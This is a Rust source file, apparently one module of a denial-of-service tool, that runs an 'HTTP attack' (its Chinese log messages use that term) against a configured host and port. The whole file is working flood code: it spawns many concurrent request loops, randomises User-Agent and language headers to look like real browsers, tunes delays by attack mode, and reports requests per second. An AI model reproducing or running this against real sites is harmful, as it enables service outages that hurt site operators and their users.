use crate::{attacks::{AttackConfig, AttackResult}, stats::StatsArc, utils};
use reqwest::Client;
use std::time::{Duration, Instant};
use tokio::time::sleep;
use rand::Rng;

pub async fn run_http_attack(config: AttackConfig, stats: StatsArc) -> AttackResult {
    println!("🌐 HTTP攻击启动");
    println!("目标: {}:{}", config.target, config.port);
    println!("协议: {}", if config.https { "HTTPS" } else { "HTTP" });
    println!("方法: {}", config.method);
    println!("攻击模式: {}", config.mode);
    println!("并发连接: {}", config.connections);
    println!("持续时间: {}秒", config.duration);
    println!();

    let start_time = Instant::now();
    let duration = Duration::from_secs(config.duration);
    
    // 调整并发数
    let adjusted_connections = utils::adjust_connections_by_mode(config.connections, &config.mode, "http");
    let (min_delay, max_delay) = utils::get_delay_by_mode(&config.mode, "http");

    println!("🎯 调整后的参数:");
    println!("实际并发数: {}", adjusted_connections);
    println!("延迟范围: {}ms - {}ms", min_delay, max_delay);
    println!();

    // 创建HTTP客户端
    let client = Client::builder()
        .timeout(Duration::from_secs(30))
        .pool_max_idle_per_host(adjusted_connections)
        .build()
        .unwrap();

    // 构建URL
    let protocol = if config.https { "https" } else { "http" };
    let url = format!("{}://{}:{}", protocol, config.target, config.port);

    // 创建攻击任务
    let mut tasks = Vec::new();
    for _ in 0..adjusted_connections {
        let client = client.clone();
        let url = url.clone();
        let config = config.clone();
        let stats = stats.clone();
        let duration = duration.clone();

        let task = tokio::spawn(async move {
            let start = Instant::now();
            
            while start.elapsed() < duration {
                let request_start = Instant::now();

                // 构建请求
                let mut request_builder = match config.method.to_uppercase().as_str() {
                    "GET" => client.get(&url),
                    "POST" => client.post(&url),
                    _ => client.get(&url),
                };

                // 添加User-Agent
                let user_agent = config.user_agent.clone().unwrap_or_else(|| utils::get_random_user_agent().to_string());
                request_builder = request_builder.header("User-Agent", user_agent);

                // 添加其他头部
                request_builder = request_builder
                    .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
                    .header("Accept-Language", utils::get_random_language())
                    .header("Accept-Encoding", "gzip, deflate")
                    .header("Connection", "keep-alive")
                    .header("Cache-Control", "no-cache");

                // 添加POST数据
                if config.method.to_uppercase() == "POST" {
                    if let Some(post_data) = &config.post_data {
                        request_builder = request_builder
                            .header("Content-Type", "application/x-www-form-urlencoded")
                            .body(post_data.clone());
                    }
                }

                // 发送请求
                match request_builder.send().await {
                    Ok(response) => {
                        let bytes_sent = if let Some(body) = response.bytes().await.ok() {
                            body.len() as u64
                        } else {
                            0
                        };
                        
                        let mut stats_guard = stats.lock().unwrap();
                        stats_guard.add_request(true, bytes_sent, 0);
                    }
                    Err(_) => {
                        let mut stats_guard = stats.lock().unwrap();
                        stats_guard.add_request(false, 0, 0);
                    }
                }

                // 延迟
                let elapsed = request_start.elapsed();
                if elapsed < Duration::from_millis(max_delay) {
                    let random_delay = rand::thread_rng().gen_range(min_delay..max_delay);
                    sleep(Duration::from_millis(random_delay)).await;
                }
            }
        });
        tasks.push(task);
    }

    // 统计监控任务
    let stats_monitor = stats.clone();
    let monitor_task = tokio::spawn(async move {
        let mut last_stats = crate::stats::Stats::default();
        let mut last_time = Instant::now();
        let start = Instant::now();

        while start.elapsed() < duration {
            sleep(Duration::from_secs(1)).await;
            let current_stats = stats_monitor.lock().unwrap();
            let current_time = Instant::now();
            let time_diff = current_time.duration_since(last_time).as_secs_f64();
            let requests_diff = current_stats.total_requests - last_stats.total_requests;
            let rps = requests_diff as f64 / time_diff;
            let elapsed_seconds = start.elapsed().as_secs();

            println!("⏱️ [{}s] HTTP RPS: {:.0} | 成功: {} | 失败: {} | 总计: {}", 
                elapsed_seconds,
                rps, 
                current_stats.successful_requests, 
                current_stats.failed_requests, 
                current_stats.total_requests
            );

            last_stats = current_stats.clone();
            last_time = current_time;
        }
    });

    // 进度监控任务
    let progress_task = tokio::spawn(async move {
        let mut elapsed = 0u64;
        while elapsed < config.duration {
            sleep(Duration::from_secs(1)).await;
            elapsed += 1;
            println!("⏳ HTTP攻击进度: {}/{} 秒", elapsed, config.duration);
        }
        println!("✅ HTTP攻击完成！");
    });

    // 等待攻击完成
    tokio::select! {
        _ = progress_task => {
            println!("✅ HTTP攻击完成！");
        }
    }

    // 取消所有任务
    for task in tasks {
        task.abort();
    }
    monitor_task.abort();

    // 生成结果
    let final_stats = stats.lock().unwrap();
    let elapsed = start_time.elapsed();
    AttackResult::new(&final_stats, elapsed)
} 